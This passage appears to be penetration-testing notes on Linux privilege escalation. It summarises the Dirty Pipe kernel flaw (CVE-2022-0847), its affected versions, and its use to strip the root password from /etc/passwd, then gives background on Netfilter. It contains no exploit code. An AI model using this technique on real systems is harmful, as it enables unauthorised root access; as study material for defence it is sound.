## (dirty pipe)

A vulnerability in the Linux kernel, named [Dirty Pipe](https://dirtypipe.cm4all.com/) ([CVE-2022-0847](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847)), allows unauthorized writing to root user files on Linux. Technically, the vulnerability is similar to the [Dirty Cow](https://dirtycow.ninja/) vulnerability discovered in 2016. All kernels from version `5.8` to `5.17` are affected and vulnerable to this vulnerability.
### Affected versions
version `5.8` to `5.17`

### impact
we could edit the `/etc/passwd` file and remove the password prompt for the root. This would allow us to log in with the `su` command without the password prompt.

# NetFilter
`Netfilter` is a Linux kernel module that provides, among other things, packet filtering, network address translation, and other tools relevant to firewalls. It controls and regulates network traffic by manipulating individual packets based on their characteristics and rules. `Netfilter` is also called the software layer in the Linux kernel. When network packets are received and sent, it initiates the execution of other modules such as packet filters. These modules can then intercept and manipulate packets. This includes the programs like `iptables` and `arptables`, which serve as action mechanisms of the `Netfilter` hook system of the IPv4 and IPv6 protocol stack.This kernel module has three main functions:

1. Packet defragmentation
2. Connection tracking
3. Network address translation (NAT)
